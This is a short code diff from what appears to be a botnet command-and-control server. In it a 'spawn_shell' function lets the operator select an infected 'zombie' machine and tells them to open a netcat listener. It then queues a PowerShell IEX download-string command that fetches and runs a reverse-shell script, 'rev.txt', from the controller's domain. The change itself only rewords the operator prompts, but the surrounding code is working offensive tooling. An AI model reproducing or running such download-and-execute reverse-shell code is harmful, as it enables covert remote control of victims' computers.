@@ -46,9 +46,9 @@ def spawn_shell(socket):
 	choice = int(socket.recv(2048).decode('utf-8'))
 	z = listener.zombies[choice]
 	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
-	socket.send(b'Please enter port: ')
-	port = socket.recv(2048).decode('utf-8')
-	socket.send(b'\nOpen a netcat listener on the selected port and press "enter" to continue.\nThe zombie will try to connect to your public IP.')
+	#socket.send(b'Please enter port: ')
+	#port = socket.recv(2048).decode('utf-8')
+	socket.send(b'\nOpen a netcat listener on the port and IP specified in the resources/rev.txt file.')
 	socket.recv(2048).decode('utf-8')
 	socket.send(b'\nPress ctrl+c to exit the shell. Dont enter exit or zombie will die!!!\n')
 	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://"+config.domain+"/rev.txt\\\"))")
